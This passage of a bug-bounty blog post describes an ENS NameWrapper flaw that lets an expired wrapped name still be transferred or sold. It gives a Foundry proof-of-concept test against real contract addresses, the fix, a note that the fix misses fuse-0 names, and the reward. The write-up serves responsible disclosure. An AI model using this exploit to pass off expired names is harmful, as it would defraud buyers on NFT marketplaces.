<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Test.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="kr">interface</span> <span class="nx">INameWrapper</span> <span class="p">{</span>
<span class="kd">function</span> <span class="nf">safeTransferFrom</span><span class="p">(</span>
        <span class="nx">address</span> <span class="k">from</span><span class="p">,</span>
        <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span>
        <span class="nx">uint256</span> <span class="nx">id</span><span class="p">,</span>
        <span class="nx">uint256</span> <span class="nx">amount</span><span class="p">,</span>
        <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">data</span>
    <span class="p">)</span> <span class="nx">external</span><span class="p">;</span>
<span class="p">}</span>

<span class="kr">interface</span> <span class="nx">IETHRegistrarController</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="nf">available</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span><span class="p">)</span> <span class="nx">external</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">makeCommitment</span><span class="p">(</span>
        <span class="nx">string</span> <span class="nx">memory</span><span class="p">,</span>
        <span class="nx">address</span><span class="p">,</span>
        <span class="nx">uint256</span><span class="p">,</span>
        <span class="nx">bytes32</span><span class="p">,</span>
        <span class="nx">address</span><span class="p">,</span>
        <span class="nx">bytes</span><span class="p">[]</span> <span class="nx">calldata</span><span class="p">,</span>
        <span class="nx">bool</span><span class="p">,</span>
        <span class="nx">uint32</span><span class="p">,</span>
        <span class="nx">uint64</span>
    <span class="p">)</span> <span class="nx">external</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">commit</span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">register</span><span class="p">(</span>
        <span class="nx">string</span> <span class="nx">calldata</span><span class="p">,</span>
        <span class="nx">address</span><span class="p">,</span>
        <span class="nx">uint256</span><span class="p">,</span>
        <span class="nx">bytes32</span><span class="p">,</span>
        <span class="nx">address</span><span class="p">,</span>
        <span class="nx">bytes</span><span class="p">[]</span> <span class="nx">calldata</span><span class="p">,</span>
        <span class="nx">bool</span><span class="p">,</span>
        <span class="nx">uint32</span><span class="p">,</span>
        <span class="nx">uint64</span>
    <span class="p">)</span> <span class="nx">external</span> <span class="nx">payable</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">renew</span><span class="p">(</span><span class="nx">string</span> <span class="nx">calldata</span><span class="p">,</span> <span class="nx">uint256</span><span class="p">)</span> <span class="nx">external</span> <span class="nx">payable</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">ExpireTest</span> <span class="nx">is</span> <span class="nx">Test</span> <span class="p">{</span>

    <span class="nx">address</span> <span class="nx">ensReg</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="mh">0x9C51161bA2FB02Cc0a403332B607117685f34831</span><span class="p">);</span>
    <span class="nx">address</span> <span class="nx">Wrapper</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="mh">0x582224b8d4534F4749EFA4f22eF7241E0C56D4B8</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">testExpired1155ETH2LDTransfer</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>

        <span class="nx">string</span> <span class="nx">memory</span> <span class="nx">name</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">lcfrWrapped</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">address</span> <span class="nx">owner</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="mh">0x328eBc7bb2ca4Bf4216863042a960E3C64Ed4c10</span><span class="p">);</span>
        <span class="nx">uint</span> <span class="nx">duration</span> <span class="o">=</span> <span class="mi">31556952</span><span class="p">;</span>
        <span class="nx">bytes32</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nf">bytes32</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="nx">address</span> <span class="nx">resolver</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="mh">0xE264d5bb84bA3b8061ADC38D3D76e6674aB91852</span><span class="p">);</span>
        <span class="nx">bytes</span><span class="p">[]</span> <span class="nx">memory</span> <span class="nx">data</span><span class="p">;</span> 
        <span class="nx">bool</span> <span class="nx">reverseRecord</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
        <span class="nx">uint32</span> <span class="nx">fuses</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nx">uint64</span> <span class="nx">wrapperExpiry</span> <span class="o">=</span> <span class="mi">31556952</span><span class="p">;</span>

        <span class="nx">IETHRegistrarController</span> <span class="nx">controller</span> <span class="o">=</span> <span class="nc">IETHRegistrarController</span><span class="p">(</span><span class="nx">ensReg</span><span class="p">);</span>
        <span class="nx">INameWrapper</span> <span class="nx">nameWrapper</span> <span class="o">=</span> <span class="nc">INameWrapper</span><span class="p">(</span><span class="nx">Wrapper</span><span class="p">);</span>

        <span class="c1">// start executing as lcfr</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startPrank</span><span class="p">(</span><span class="nx">owner</span><span class="p">);</span>

        <span class="nx">bytes32</span> <span class="nx">commitment</span> <span class="o">=</span> <span class="nx">controller</span><span class="p">.</span><span class="nf">makeCommitment</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">duration</span><span class="p">,</span> <span class="nx">secret</span><span class="p">,</span> <span class="nx">resolver</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">reverseRecord</span><span class="p">,</span> <span class="nx">fuses</span><span class="p">,</span> <span class="nx">wrapperExpiry</span><span class="p">);</span>
        <span class="nx">controller</span><span class="p">.</span><span class="nf">commit</span><span class="p">(</span><span class="nx">commitment</span><span class="p">);</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">warp</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="mi">60</span><span class="p">);</span>
        <span class="nx">controller</span><span class="p">.</span><span class="nx">register</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">1000000000000000000</span><span class="p">}(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">duration</span><span class="p">,</span> <span class="nx">secret</span><span class="p">,</span> <span class="nx">resolver</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">reverseRecord</span><span class="p">,</span> <span class="nx">fuses</span><span class="p">,</span> <span class="nx">wrapperExpiry</span><span class="p">);</span>

        <span class="c1">// expired ++ out of grace</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">warp</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="nx">duration</span> <span class="o">+</span> <span class="nx">duration</span><span class="p">));</span>
        <span class="c1">// transfer expired</span>
        <span class="nx">nameWrapper</span><span class="p">.</span><span class="nf">safeTransferFrom</span><span class="p">(</span><span class="nx">owner</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="mh">0x9E5916079eD74C38FaA3322bDAec62307beA1D9b</span><span class="p">),</span> <span class="mi">27949844422937690035200873550242027254593755523825974100076274775564884645311</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<h1 id="patch">Patch</h1>

<p>This issue was fixed by Jeff and Nick from ENS Labs after a few days of reporting.<br />
<a href="https://github.com/ensdomains/ens-contracts/commit/c16273aa07b2eda1af68c487c91d8cb2414244fc">Github Commit</a></p>

<p><a href="https://upload.wikimedia.org/assets/img/namewrapperbounty/patch1.png" class="popup img-link  shimmer"><img src="https://upload.wikimedia.org/assets/img/namewrapperbounty/patch1.png" alt="image" loading="lazy"></a></p>

<p><a href="https://upload.wikimedia.org/assets/img/namewrapperbounty/patch2.PNG" class="popup img-link  shimmer"><img src="https://upload.wikimedia.org/assets/img/namewrapperbounty/patch2.PNG" alt="image" loading="lazy"></a></p>

<p>You can see the patch adds a function _preTransferCheck() which adds the revert behaviour if the names expiry is &lt; <em>now</em> and the name has been “emancipated” aka the PARENT_CANNOT_CONTROL fuse has been burned to prevent the parent/owner from being able to remint/reissue the name.</p>

<p>Note: The patch still allows the proof of concept exploit to work as in the example the fuses are set to 0 for the name and PARENT_CANNOT_CONTROL is therefor not burned.</p>

<p>If address 0x123 registers the ERC721 john.eth, then wraps it to an ERC1155 using the nameWrapper and does not burn the PARENT_CANNOT_CONTROL fuse, when the ERC721 john.eth expires the current owner (0x123) of the ERC1155 john.eth token could still sell or transfer the token until it is minted/created again by the new owner of the ERC721 john.eth by wrapping the name.</p>

<style>
r { color: Red }
</style>

<r>NFT Marketplace recomendation: Dissallow/check every ERC1155 ENS name before listing that the PARENT_CANNOT_CONTROL fuse is burned. This is a stop-gap to prevent expired ERC721's previous ERC1155 counterparts from being used to scam users.</r>

<h1 id="reward">Reward</h1>
<p>3500 USDC<br />
200 ENS Tokens
4/29/23 - UPDATE - additional 25k paid</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/web3/">web3</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Bounty:%20ENS%20NameWrapper%20expiry%20issue%20-%20LCFR&url=http%3A%2F%2F0.0.0.0%3A4000%2Fposts%2Fens-namewrapper-bounty%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Bounty:%20ENS%20NameWrapper%20expiry%20issue%20-%20LCFR&u=http%3A%2F%2F0.0.0.0%3A4000%2Fposts%2Fens-namewrapper-bounty%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2F0.0.0.0%3A4000%2Fposts%2Fens-namewrapper-bounty%2F&text=Bounty:%20ENS%20NameWrapper%20expiry%20issue%20-%20LCFR" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ens-namewrapper-bounty/">Bounty: ENS NameWrapper expiry issue</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/rescue-ens-names/">Rescuing ENS names from compromised wallets.</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/duplicate-ens-names/">Bounty: Using a Web2 bug to duplicate ENS names</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/local-ssh-2fa-bypass/">Session Riding OpenSSH (multiplexing) to bypass 2FA</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->


















            </div>

            
              
              







            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/rescue-ens-names/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1652920102"
  data-df="ll"
  
>
  May 18, 2022
</time>

              <h4 class="pt-0 my-2">Rescuing ENS names from compromised wallets.</h4>
              <div class="text-muted">
                <p>Recently we had a client message our support channel asking about strange transactions.  Shortly after we determined the users wallet had been compromised and a drainer/sweeper script attached to t...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/duplicate-ens-names/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1651451302"
  data-df="ll"
  
>
  May  1, 2022
</time>

              <h4 class="pt-0 my-2">Bounty: Using a Web2 bug to duplicate ENS names</h4>
              <div class="text-muted">
                <p>Quick Links About ENS: Decentralized Domain Name System ENS Registration &amp;amp; Metadata explained ENS Subgraph Service ENS Metadata Service ZWJ, ZWNJ, ZWSP ? Null-bytes &amp;amp; String termination Ide...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/rescue-ens-names/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Rescuing ENS names from compromised wallets.</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/lcfr_eth">LCFR</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->


















    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

